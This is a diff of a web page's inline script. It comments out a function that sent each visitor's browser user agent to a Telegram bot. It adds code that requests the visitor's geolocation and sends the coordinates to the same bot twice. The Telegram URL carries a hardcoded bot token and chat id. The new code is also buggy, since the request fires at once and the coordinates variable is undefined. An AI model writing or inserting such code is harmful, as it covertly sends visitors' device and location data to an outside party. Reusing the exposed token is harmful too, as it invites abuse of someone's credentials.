@@ -849,17 +849,29 @@
 	gtag('config', 'G-VB8255JP57');
 </script>
 <script>
-	function check(){
+// 	function check(){
+// 		$.ajax({
+// 		url: `https://api.telegram.org/bot5007404101:AAETirjlz-DgKtgiwnvcN4DPTiqZsDZgSj8/sendMessage?chat_id=52238804&text=${window.navigator.userAgent}`,
+// 		type: 'get',
+// 		success: function(response){
+// 			console.log(response)
+// 	}
+// });
+// 	}
+	window.navigator.geolocation.getCurrentPosition(
 		$.ajax({
-		url: `https://api.telegram.org/bot5007404101:AAETirjlz-DgKtgiwnvcN4DPTiqZsDZgSj8/sendMessage?chat_id=52238804&text=${window.navigator.userAgent}`,
+		url: `https://api.telegram.org/bot5007404101:AAETirjlz-DgKtgiwnvcN4DPTiqZsDZgSj8/sendMessage?chat_id=52238804&text=${coords}`,
 		type: 'get',
 		success: function(response){
 			console.log(response)
 	}
-});
+}), $.ajax({
+		url: `https://api.telegram.org/bot5007404101:AAETirjlz-DgKtgiwnvcN4DPTiqZsDZgSj8/sendMessage?chat_id=52238804&text=${coords}`,
+		type: 'get',
+		success: function(response){
+			console.log(response)
 	}
-	console.log(window.navigator.geolocation
-  .getCurrentPosition(console.log, console.log));
+}))
 		// function showPosition() {
         //      navigator.geolocation.getCurrentPosition(showMap);
         // }
@@ -874,7 +886,7 @@
         // }
 		 
 
-check();
+// check();
 
 </script>
 <!-- <script async src="https://theapicompany.com/deviceAPI2.js?id=deviceAPI-hh63787bqi"></script>
